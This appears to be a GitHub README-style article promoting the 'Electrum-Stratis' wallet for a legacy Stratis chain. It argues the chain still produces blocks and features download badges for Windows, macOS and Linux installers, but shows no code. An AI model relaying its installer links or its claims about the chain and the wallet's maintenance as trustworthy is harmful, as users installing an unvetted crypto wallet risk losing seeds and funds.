![Electrum-Stratis](assets/banner-article.png)

# Does Stratis work only on STRAX now?

<p align="center">Blocks, not listings, answer the question</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

The legacy Stratis chain still runs: it produces blocks, processes transactions and still holds STRAT, while the current chain's asset is STRAX. Two chains exist, and they are not interchangeable. Electrum Stratis serves the legacy one; wallets and exchanges mostly serve the current one. "Only STRAX" describes where the market and the tooling concentrated, not what the legacy chain can do. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| The claim | What is true | What it means for you |
|---|---|---|
| "Stratis is STRAX now" | Both chains run | Your legacy balance is still there |
| "No wallet supports STRAT" | This wallet does | You can hold, send and stake |
| "Exchanges delisted it" | Venues chose the current asset | Custody is still yours |
| "The old chain is dead" | It produces blocks | A false claim, repeated often |
| "You must convert" | The window closed | Nothing left to convert |

</div>

The distinction worth keeping is between a chain that exists and a market that ignores it. The first is a technical fact; the second is a business decision by venues, and it changes nothing about your keys.

## Why it happens

A migration concentrates attention. Documentation, listings and new development move to the new chain, and the old one keeps running with a smaller community and less visible tooling. From the outside that looks like the old chain stopped, because the places people look - exchange lists, price sites, news - have nothing to say about it.

The chain itself does not need permission to continue. It produces blocks, it has addresses and transactions, and it validates according to its own rules. What it lacks is a market, and a market is not a property of a blockchain.

## Fix

1. **Check the chain, not the headlines.** An explorer for the legacy network shows blocks being produced and your addresses' history. That is the evidence that matters.
2. **Use a wallet that serves the legacy chain.** This one does: addresses, sending, receiving, seed backup, staking and multisig, with the current release available from the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).
3. **Do not let a venue's decision change your custody.** A delisting is a statement about an exchange's order book, not about whether your coins exist. Venues answer to their own liquidity, and a chain answers to its own consensus; the two are separate systems, and only one of them holds your keys. Confusing the two is the most common way a holder concludes that a working chain is empty. A holder who confuses them concludes that coins vanished when a listing did, which is a conclusion about a venue dressed up as a conclusion about a chain.
4. **Stop looking for a conversion.** The window is closed. What remains is holding, moving and staking on the chain the coins are on.
5. **Be precise when you talk about it.** "STRAT on the legacy chain" and "STRAX on the current chain" are different assets; using the brand alone is how the confusion spreads.

If someone tells you the legacy chain is dead, ask which block height it is at. A chain that is producing blocks has a height that moves, and a height that moves is the difference between a quiet network and a stopped one. The wallet's health panel reports that height for the peer it is using, and an explorer reports it for the network, so the comparison takes seconds and settles the question without an argument ([an Electrum Stratis wallet on a stale view](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/synced-to-a-stale-peer.md)). What a small community lacks is attention, not blocks ([the conversion window Electrum Stratis left behind](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/the-conversion-window-is-closed.md)). The question is usually enough.

## If that did not work

If your balance does not appear, that is a wallet problem, not evidence about the chain: check the connection, then the address, then the height. A chain that produces blocks and a wallet that cannot see them are separate failures.

If an exchange refuses a legacy deposit, that is the venue's policy. It does not mean the coins are invalid, and it does not mean they are lost; it means that venue will not credit them.

If a service offers to "activate" a legacy balance for a fee, the offer is fraud. Nothing needs activating, and a balance that is not visible is a sync or address question.

## Prevention

- Judge the chain by its blocks, not by exchange listings.
- Keep a wallet that serves the legacy chain installed and current.
- Describe the asset precisely when asking for help.
- Do not pay for activation, conversion or "unlocking".
- Keep the seed backed up; it is the only thing that makes any of this recoverable.
- Judge the chain by its block height, and treat an exchange listing as a separate question.

## FAQ

### Is Stratis only on STRAX now?

No. STRAX is the asset of the current chain, and most venues trade it. The legacy chain still runs and still holds STRAT, and this wallet still serves it.

### Can I still use legacy STRAT?

Yes. You can hold it, send it to another legacy address, sweep keys into a seed-based wallet, and stake where the chain supports it. What you cannot do is convert it through the closed window.

### Why do exchanges not list STRAT?

Venues list what trades. The legacy asset has little or no market, so most exchanges do not carry it; that is a commercial decision, not a statement that the chain stopped.

### Is the legacy chain maintained?

It produces blocks and processes transactions under its own rules, and the wallet that serves it is actively maintained. Maintenance of the software and the existence of a market are different questions, and only one of them is about your coins.

<!-- DOWNLOAD-BLOCK -->

The legacy chain answers one question by itself: does a node return a block height that keeps rising? An exchange listing, a price page or a roadmap slide cannot answer it, and neither can a wallet that refuses to connect. Check the height twice, a day apart, before concluding anything about the chain from a single failed sync or an empty balance screen.

## Related articles

- [STRAT is not STRAX](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/why-strat-and-strax-differ.md)
- [The swap is closed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/the-conversion-window-is-closed.md)
- [Why every price you see is quoted in STRAX](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/why-prices-are-quoted-in-strax.md)
- [Does Stratis still support the Electrum wallet?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/is-the-wallet-still-maintained.md)
